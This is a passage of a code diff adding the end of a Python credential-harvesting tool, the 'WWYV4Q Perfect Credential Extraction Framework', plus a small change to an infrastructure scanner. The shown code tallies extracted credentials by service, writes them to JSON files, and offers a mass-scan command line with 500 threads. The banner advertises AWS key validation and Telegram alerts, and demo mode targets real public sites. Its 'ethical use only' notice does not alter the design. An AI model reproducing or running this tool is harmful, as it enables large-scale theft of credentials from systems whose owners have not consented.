+            service_counts[cred.service_type] = service_counts.get(cred.service_type, 0) + 1
+        
+        for service, count in sorted(service_counts.items(), key=lambda x: x[1], reverse=True):
+            summary += f"  {service.upper()}: {count}\n"
+        
+        summary += f"""
+🏁 WWYV4Q Perfect Framework session ended
+🕐 End Time: {self.stats['end_time'].strftime('%Y-%m-%d %H:%M:%S')} UTC
+👤 Operator: wKayaa
+"""
+        
+        print(summary)
+        self.logger.critical(summary)
+        
+        # Save results to file
+        await self._save_results()
+    
+    async def _save_results(self):
+        """Save extraction results"""
+        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
+        
+        # Create results directory
+        results_dir = Path('./results/perfect_production')
+        results_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Save credentials as JSON
+        credentials_file = results_dir / f"credentials_{timestamp}.json"
+        credentials_data = [asdict(cred) for cred in self.extracted_credentials]
+        
+        async with aiofiles.open(credentials_file, 'w') as f:
+            await f.write(json.dumps(credentials_data, indent=2, default=str))
+        
+        # Save statistics
+        stats_file = results_dir / f"stats_{timestamp}.json"
+        async with aiofiles.open(stats_file, 'w') as f:
+            await f.write(json.dumps(self.stats, indent=2, default=str))
+        
+        self.logger.info(f"📁 Results saved to {results_dir}")
+
+# CLI Interface
+async def main():
+    """Main CLI function"""
+    parser = argparse.ArgumentParser(
+        description="WWYV4Q Perfect Credential Extraction Framework",
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    
+    parser.add_argument('-t', '--targets', nargs='+',
+                       help='Target hosts or URLs to scan')
+    parser.add_argument('--mass-scan', action='store_true',
+                       help='Enable mass scanning mode')
+    parser.add_argument('--threads', type=int, default=500,
+                       help='Number of concurrent threads')
+    parser.add_argument('--timeout', type=int, default=15,
+                       help='Request timeout in seconds')
+    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
+                       default='INFO', help='Logging level')
+    
+    args = parser.parse_args()
+    
+    # Setup logging
+    logging.basicConfig(
+        level=getattr(logging, args.log_level),
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    )
+    
+    # Update config with CLI arguments
+    config = PERFECT_CONFIG.copy()
+    config["extraction"]["threads"] = args.threads
+    config["extraction"]["timeout"] = args.timeout
+    
+    # Print banner
+    print(f"""
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    WWYV4Q Perfect Credential Extraction Framework           ║
+║                                    v4.0                                      ║
+║                                 by wKayaa                                    ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║                                                                              ║
+║  ⚠️  ETHICAL USE ONLY - AUTHORIZED TESTING ENVIRONMENTS ONLY ⚠️              ║
+║                                                                              ║
+║  🎯 Advanced credential extraction with AWS validation                       ║
+║  🔍 Mass scanning capabilities                                              ║
+║  📧 Real-time Telegram alerts                                               ║
+║  🚀 High-performance async architecture                                     ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+[*] Framework initialized - Date: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+[*] User: wKayaa
+[*] Threads: {args.threads}
+[*] Timeout: {args.timeout}s
+""")
+    
+    # Initialize framework
+    framework = WWYV4QPerfectFramework(config)
+    
+    try:
+        if args.mass_scan:
+            await framework.perfect_main()
+        elif args.targets:
+            await framework.perfect_main(args.targets)
+        else:
+            # Demo mode with example targets
+            demo_targets = [
+                "https://httpbin.org",
+                "https://jsonplaceholder.typicode.com",
+                "https://api.github.com"
+            ]
+            await framework.perfect_main(demo_targets)
+            
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        logging.error(f"Framework error: {e}", exc_info=True)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
+    
 # Disable SSL warnings for testing environments
 disable_warnings(InsecureRequestWarning)
 
@@ -409,6 +1502,7 @@ class InfrastructureScanner(BaseModule):
         
         # Tentative de récupération de banner HTTP
         for protocol in ['https', 'http']:
+            credential_value = credential.access_key
             try:
                 connector = aiohttp.TCPConnector(ssl=False)
                 async with aiohttp.ClientSession(
